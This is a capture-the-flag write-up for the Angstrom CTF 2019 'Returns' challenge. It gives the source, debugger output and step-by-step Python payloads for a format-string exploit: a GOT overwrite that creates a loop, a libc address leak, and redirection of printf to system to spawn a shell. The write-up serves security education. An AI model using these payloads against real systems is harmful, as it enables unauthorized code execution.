# Angstrom CTF 2019
## Returns

> Need to make a return? This program might be able to help you out (source, libc).
> /problems/2019/returns/<br/>
> nc shell.actf.co 19307<br/>
> Author: kmh11

---

### Checksec output
> Arch:     amd64-64-little<br/>
> RELRO:    Partial RELRO<br/>
> Stack:    Canary found<br/>
> NX:       NX enabled<br/>
> PIE:      No PIE (0x400000)

### Given source code
```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	char item[50];
	printf("What item would you like to return? ");
	fgets(item, 50, stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("We didn't sell you a ");
		printf(item);
		printf(". You're trying to scam us! We don't even sell ");
		printf(item);
		printf("s. Leave this place and take your ");
		printf(item);
		printf(" with you. ");
	}
	printf("Get out!\n");
	return 0;
}
```

We are given the task's binary, the libc (which happens to be the libc from 
Ubuntu 16.04 Xenial) and... the source code!

This task is almost identical to the angstrom's purchases task except it doesn't have
the `flag` function which gave us the flag. Knowing that, we already know the 
vulnerability - format-string vulnerability.

The plan is to call `system("/bin/sh")`, so we need the libc base address. 
Then, knowing `system` address we want to redirect execution to it and pass
`"/bin/sh"` as an argument.

How do we do it only with one possibility to write to the buffer `item`? 
We could make ourselves a loop.
Luckily the binary has PIE disabled and last `printf` got translated into `puts`.
If we overwrite GOT entry of puts with address right before fgets call we
obtain a loop! Now we can use the format-string vulnerability multiple times.

### Custom loop
From `0x401303` jumping to `0x40122e`.
```
0x40122e <main+136>    mov    rdx, qword ptr [rip + 0x2e4b] <0x404080>
0x401235 <main+143>    lea    rax, [rbp - 0x40]
0x401239 <main+147>    mov    esi, 0x32
0x40123e <main+152>    mov    rdi, rax
0x401241 <main+155>    call   fgets@plt <0x401080>  # fgets(item, 50, stdin);
(...)
0x4012fc <main+342>    lea    rdi, [rip + 0xdcc]
0x401303 <main+349>    call   puts@plt <0x401030>
```

We need only to overwrite last 2 Bytes of the address, because `puts` got entry
already contains similar address.

#### GOT when calling first vulnerable printf for the first time
```
   0x401296 <main+240>    lea    rax, [rbp - 0x40]
   0x40129a <main+244>    mov    rdi, rax
   0x40129d <main+247>    mov    eax, 0
 ► 0x4012a2 <main+252>    call   printf@plt <0x401070>
```
```
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 9
[0x404018] puts@GLIBC_2.2.5 -> 0x401036 (puts@plt+6) ◂— push   0 /* 'h' */
(...)
```

The binary also overwrites byte before first nullbyte with a nullbyte.
Thus we insert dummy `a` right before padding of nullbytes.

#### Payload creating a loop:
```Python
got_puts = 0x404018
before_fgets = 0x40122e

payload = "%018u%12$hhn%028u%13$hhn" # set 40122e
payload += 'a'
payload += '\x00' * (32-len(payload))
payload += p64(got_puts+1)
payload += p64(got_puts)
payload += '\n'
```

#### How to get a libc leak then?
Luckily there is `__libc_start_main+240` address on the stack when calling vulnerable
`printf`.

```
   0x401296 <main+240>    lea    rax, [rbp - 0x40]
   0x40129a <main+244>    mov    rdi, rax
   0x40129d <main+247>    mov    eax, 0
 ► 0x4012a2 <main+252>    call   printf@plt <0x401070>
        format: 0x7fffffffe5f0 ◂— 0x3200007024383125 /* '%18$p' */
        vararg: 0x7fffffffbf48 ◂— "We didn't sell you a 507360000000000000000004158470016 "

pwndbg> stack 20
00:0000│ rsp  0x7fffffffe5d8 —▸ 0x401308 (main+354) ◂— mov    eax, 0
01:0008│      0x7fffffffe5e0 —▸ 0x7ffff7ffe168 ◂— 0x0
02:0010│      0x7fffffffe5e8 ◂— 0xf0b5ff
03:0018│ rdi  0x7fffffffe5f0 ◂— 0x3200007024383125 /* '%18$p' */
04:0020│      0x7fffffffe5f8 ◂— '$hhn%028u%13$hhn'
05:0028│      0x7fffffffe600 ◂— 'u%13$hhn'
06:0030│      0x7fffffffe608 ◂— 0x0
07:0038│      0x7fffffffe610 —▸ 0x404019 (_GLOBAL_OFFSET_TABLE_+25) ◂— 0x2000000000004012
08:0040│      0x7fffffffe618 —▸ 0x404018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x40122e (main+136) ◂— mov    rdx, qword ptr [rip + 0x2e4b]
09:0048│      0x7fffffffe620 —▸ 0x7fffffff000a ◂— 0x0
0a:0050│      0x7fffffffe628 ◂— 0xb264bae28067b100
0b:0058│ rbp  0x7fffffffe630 —▸ 0x401330 (__libc_csu_init) ◂— endbr64 
0c:0060│      0x7fffffffe638 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
```

#### Payload leaking libc address:
```Python
payload2 = "%18$p"
payload2 += '\n'

io.send(payload2)
io.recvuntil('sell you a ')
libc_leak_hex_str = io.recvuntil('.') # (__libc_start_main+240) 
print(libc_leak_hex_str[:-1])
libc_start_main_addr_240 = int(libc_leak_hex_str[2:-1], 16)

libc_start_main_addr = libc_start_main_addr_240 - 240
libc_start_main_offset = 0x20740
libc_base_addr = libc_start_main_addr - libc_start_main_offset
libc_system_offset = 0x45390
libc_system_addr = libc_base_addr + libc_system_offset
```

With the libc leak, we calculate libc base address and then the address of a `system`
function. Now, how do we call it with `"/bin/sh"`?
We'll abuse another vulnerable printf call.

With one of the `printf`s we overwrite got entry of `printf` with `system`,
and using another one we call `system("/bin/sh")`.
We need to pass `"/bin/sh"` and rest of the payload at the same time. 
Luckily one can safely spawn shell with `system("/bin/sh;[rest of payload]")`.

Most of the times we'll need to overwrite only last 3 bytes of the address:

```
[0x404038] printf@GLIBC_2.2.5 -> 0x7ffff7a62800 (printf) ◂— sub    rsp, 0xd8
{<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
```

I couldn't fit the payload overwriting 2 bytes and then 1 byte, so I overwrote
last 4 bytes.

I've also stumbled upon a limit with format-string padding:
```C
unsigned int d = 13378;
printf("aha%02147483614u!", d);    // prints "aha[zeroes]!"
printf("aha%02147483615u!", d);    // prints "aha"
```

Luckily we can execute exploit couple of times until it works.

#### Payload spawning shell:
```Python
got_printf = 0x404038

payload = "/bin/sh;"

# lowest 4B
to_write = libc_system_addr & 0xffffffff
to_write -= len("/bin/sh;")

payload += "%0{}u%14$n".format(to_write)
payload += 'a' # overwritten with NULLBYTE by binary itself
payload += '\x00' * ((8 - len(payload)) % 8)
# aligned to 8B
assert(payload[-1] == '\x00') # at least one NULLBYTE required

payload += p64(got_printf)
payload += '\n'

assert(len(payload) <= 50)
io.send(payload)
```

When we overwrite 4 bytes at the same time, the binary prints massive amount of 
zeroes. Printing them to the console takes ages... but finally spawns our beloved 
shell.

@mzr - justCatTheFish

